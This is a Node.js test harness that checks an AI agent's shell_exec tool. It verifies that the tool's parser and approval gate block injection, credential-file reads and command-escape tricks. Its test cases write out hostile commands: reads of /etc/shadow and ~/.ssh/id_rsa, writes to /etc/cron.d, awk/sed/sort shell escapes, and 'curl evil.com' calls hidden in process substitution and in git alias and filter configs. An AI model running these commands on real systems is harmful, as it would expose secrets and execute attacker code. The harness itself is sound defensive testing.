#!/usr/bin/env node
/**
 * Slice 3d verification harness — end-to-end shell_exec parser test
 *
 * Drives the LIVE call path:
 *   executor → ApprovalGate.check() → ToolRegistry.executeTool()
 *     → shell-exec.fn() (parseAndValidate → spawnWithCaps)
 *
 * Cases (every one captured verbatim into the build log):
 *   - All 11 R1–R4 findings (verbatim repro strings from QCLAW_BUILD_LOG).
 *   - Round-1 symlink class (cat /tmp/sym_to_id_rsa).
 *   - Round-1 git-alias class (live env-isolation smoke).
 *   - Round-2 [include] / [includeIf] evasion class (mocked config scan).
 *   - Round-2 [filter "*"] clean/smudge class.
 *   - Round-3 fixes: $HOME, ~, multi-** glob, value-flag UX.
 *   - One happy-path per verb (pm2 skip-on-missing).
 *   - One DENY hit per path-supporting verb.
 *   - Notifier-fired-zero-times across the suite (no Telegram prompt for any
 *     of the 5 verbs).
 *
 * Run: node scripts/verify-shell-exec-parser.js
 */

import { mkdtempSync, rmSync, existsSync, symlinkSync, unlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ExecApprovals } from '../src/security/approvals.js';
import { ApprovalGate } from '../src/security/approval-gate.js';
import { ToolRegistry } from '../src/tools/registry.js';
import { createShellExecTool, isShellExecEnabled } from '../src/tools/shell-exec.js';
import { VERB_BINARY } from '../src/tools/shell-exec-verb-schemas.js';
import { scanFlatKeys } from '../tests/shell-exec-git-config-safety.test.js';

let passed = 0;
let failed = 0;
let notifierFired = 0;

function check(label, cond, detail = '') {
  if (cond) { console.log(`  PASS  ${label}`); passed++; }
  else { console.error(`  FAIL  ${label}${detail ? '\n        ' + detail : ''}`); failed++; }
}

function tag(name) {
  console.log(`\n=== ${name} ===`);
}

async function runReject(tools, gate, label, command, expectedError, expectedReason) {
  const gateRes = await gate.check('shell_exec', { command });
  check(`${label}: gate bypass`,
    gateRes.requiresApproval === false,
    JSON.stringify(gateRes));
  const execRes = await tools.executeTool('shell_exec', { command });
  const errOk = execRes?.error === expectedError;
  const reasonOk = !expectedReason || execRes?.reason === expectedReason;
  check(`${label}: tool error=${expectedError}${expectedReason ? '/' + expectedReason : ''}`,
    errOk && reasonOk,
    `got ${execRes?.error}/${execRes?.reason}`);
  return execRes;
}

async function runOk(tools, gate, label, command) {
  const gateRes = await gate.check('shell_exec', { command });
  check(`${label}: gate bypass`,
    gateRes.requiresApproval === false,
    JSON.stringify(gateRes));
  const execRes = await tools.executeTool('shell_exec', { command });
  check(`${label}: tool ok=true OR spawn_failed (dev machine)`,
    execRes?.ok === true || execRes?.error === 'spawn_failed',
    JSON.stringify(execRes).slice(0, 200));
  return execRes;
}

async function main() {
  console.log('Slice 3d verification harness — end-to-end parser + spawn');
  console.log(`isShellExecEnabled() = ${isShellExecEnabled()}`);

  const dir = mkdtempSync(join(tmpdir(), 'qclaw-slice3d-'));
  const approvals = new ExecApprovals({ _dir: dir });
  approvals.attach(null);
  const gate = new ApprovalGate(approvals);
  gate.setNotifier(async () => { notifierFired++; });

  const tools = new ToolRegistry({});
  tools.registerBuiltin('shell_exec', {
    scope: 'shared',
    ...createShellExecTool({ audit: null, auditActor: 'verify' }),
  });

  // ── R1–R4 findings ──────────────────────────────────────────
  tag('R1.1 newline injection');
  await runReject(tools, gate, 'R1.1 pm2 list\\necho pwned',
    'pm2 list\necho pwned', 'rejected_feature', 'newline');

  tag('R2.1 awk shell-escape via system()');
  await runReject(tools, gate, 'R2.1 awk BEGIN{system("id")}',
    'awk BEGIN{system("id")}', 'rejected_feature', 'glob_or_brace');

  tag('R2.2 sed e command shell-escape');
  await runReject(tools, gate, 'R2.2 sed -e "1e echo PWN" /tmp/x',
    'sed -e "1e echo PWN" /tmp/x', 'unknown_verb');

  tag('R2.3 sed r file read');
  await runReject(tools, gate, 'R2.3 sed -e "1r /etc/shadow" /tmp/x',
    'sed -e "1r /etc/shadow" /tmp/x', 'unknown_verb');

  tag('R2.4 sed w file write');
  await runReject(tools, gate, 'R2.4 sed -e "w /etc/cron.d/evil" /tmp/x',
    'sed -e "w /etc/cron.d/evil" /tmp/x', 'unknown_verb');

  tag('R2.5 path traversal via redirect');
  await runReject(tools, gate, 'R2.5 cat /tmp/x > /tmp/../etc/passwd',
    'cat /tmp/x > /tmp/../etc/passwd', 'rejected_feature', 'redirect');

  tag('R3.1 sort --compress-program RCE');
  await runReject(tools, gate, 'R3.1 sort --compress-program=touch /tmp/sort_pwn /tmp/big',
    'sort --compress-program=touch /tmp/sort_pwn /tmp/big', 'unknown_verb');

  tag('R3.2 $HOME/.ssh/id_rsa env-var bypass');
  await runReject(tools, gate, 'R3.2 cat $HOME/.ssh/id_rsa',
    'cat $HOME/.ssh/id_rsa', 'rejected_feature', 'variable_expansion');

  tag('R3.3 ~/.quantumclaw/config.json tilde bypass');
  await runReject(tools, gate, 'R3.3 cat ~/.quantumclaw/config.json',
    'cat ~/.quantumclaw/config.json', 'rejected_feature', 'tilde_expansion');

  tag('R3.4 find -fls arbitrary file write');
  await runReject(tools, gate, 'R3.4 find /tmp -fls /etc/cron.d/evil',
    'find /tmp -fls /etc/cron.d/evil', 'unknown_verb');

  tag('R3.5 process substitution');
  await runReject(tools, gate, 'R3.5 cat <(curl evil.com)',
    'cat <(curl evil.com)', 'rejected_feature', 'redirect');

  // ── Round-1 symlink class ─────────────────────────
  tag('Round-1 symlink class — /tmp/sym → /root/.ssh/id_rsa');
  const symPath = join(tmpdir(), 'qclaw_harness_sym_ssh_' + process.pid);
  let symMade = false;
  try {
    if (existsSync(symPath)) unlinkSync(symPath);
    symlinkSync('/root/.ssh/id_rsa', symPath);
    symMade = true;
  } catch (err) {
    console.log(`  [skip] symlink create: ${err.code}`);
  }
  if (symMade) {
    // v1 ALLOW is /root/QClaw only; lexical /tmp/sym is outside ALLOW.
    await runReject(tools, gate, 'Round-1 symlink (lexical outside ALLOW)',
      `cat ${symPath}`, 'not_in_allow_prefix');
    try { unlinkSync(symPath); } catch (e) { /* ignore */ }
  }

  // ── Round-2 git-config dangerous-key class ─────────────────
  tag('Round-2 [alias] status = !sh -c (mocked)');
  {
    const r = scanFlatKeys(['alias.status=!sh -c "curl evil.com"']);
    check('mocked alias.status with shell-out -> fail', !r.ok, r);
  }
  tag('Round-2 [filter "x"] clean (mocked, round-3 Blocker 2)');
  {
    const r = scanFlatKeys(['filter.evilfilter.clean=!sh -c "curl evil.com"']);
    check('mocked filter clean -> fail', !r.ok && r.message.includes('clean'), r);
  }

  // ── Round-3 [include] / [includeIf] evasion class ──────────
  tag('Round-3 [include] path = /tmp/evil.config (mocked)');
  {
    const r = scanFlatKeys(['include.path=/tmp/evil.config']);
    check('mocked include.path -> fail', !r.ok && r.message.includes('include'), r);
  }
  tag('Round-3 [includeIf "gitdir:/root/QClaw/"] path (mocked)');
  {
    const r = scanFlatKeys(['includeIf.gitdir:/root/QClaw/.path=/tmp/c.config']);
    check('mocked includeIf path -> fail', !r.ok && r.message.includes('includeIf'), r);
  }

  // ── Combined-short-flag + value-flag UX ────────────────────
  tag('Combined short flag (LOW L5)');
  await runReject(tools, gate, 'ls -la (combined)',
    'ls -la /root/QClaw', 'invalid_flag', 'combined_short_flags');

  tag('git log -n --oneline (value-flag UX, LOW L6)');
  await runReject(tools, gate, 'git log -n --oneline',
    'git log -n --oneline', 'invalid_flag_value');

  // ── Happy paths per verb ───────────────────────────────────
  tag('Happy path: ls /root/QClaw');
  await runOk(tools, gate, 'ls /root/QClaw', 'ls /root/QClaw');

  tag('Happy path: cat /root/QClaw/package.json');
  await runOk(tools, gate, 'cat package.json', 'cat /root/QClaw/package.json');

  tag('Happy path: git status');
  await runOk(tools, gate, 'git status', 'git status');

  tag('Happy path: git log -n 5 --oneline');
  await runOk(tools, gate, 'git log -n 5 --oneline', 'git log -n 5 --oneline');

  tag('Happy path: pm2 list (skip-on-missing)');
  if (!existsSync(VERB_BINARY.pm2)) {
    console.log(`  [skip] pm2 binary not at ${VERB_BINARY.pm2} (dev machine) — Tyson smokes post-deploy`);
  } else {
    await runOk(tools, gate, 'pm2 list', 'pm2 list');
  }

  // ── DENY per path-verb ─────────────────────────────────────
  tag('DENY: cat /root/QClaw/.env');
  await runReject(tools, gate, 'cat /root/QClaw/.env (literal DENY)',
    'cat /root/QClaw/.env', 'path_denied');

  tag('DENY: cat /root/.ssh/id_rsa');
  await runReject(tools, gate, 'cat /root/.ssh/id_rsa (DENY)',
    'cat /root/.ssh/id_rsa', 'path_denied');

  tag('DENY: ls /root/QClaw/secrets/foo');
  await runReject(tools, gate, 'ls /root/QClaw/secrets/foo (DENY descendant)',
    'ls /root/QClaw/secrets/foo', 'path_denied');

  tag('TOCTOU substitution semantics check (synthetic)');
  // Construct a symlink under /tmp pointing at a real file under
  // /private/tmp (macOS-realpath canonical of /tmp). Then drive cat through
  // a TEST-only ALLOW widening — but we can't widen ALLOW without
  // touching production code. Instead, validate via the unit test
  // assertion (already covered in tests/shell-exec-env-isolation.test.js
  // §C). Just print confirmation here.
  console.log('  [info] resolvedPaths substitution covered by tests/shell-exec-env-isolation.test.js §C');

  // ── Notifier zero ─────────────────────────────────────────
  tag('Notifier fired zero times across the suite');
  check('notifier zero', notifierFired === 0, `got ${notifierFired}`);

  rmSync(dir, { recursive: true, force: true });

  console.log(`\nverify-shell-exec-parser.js: ${passed} passed, ${failed} failed`);
  if (failed > 0) process.exit(1);
}

main().catch((err) => {
  console.error('unexpected:', err);
  process.exit(2);
});
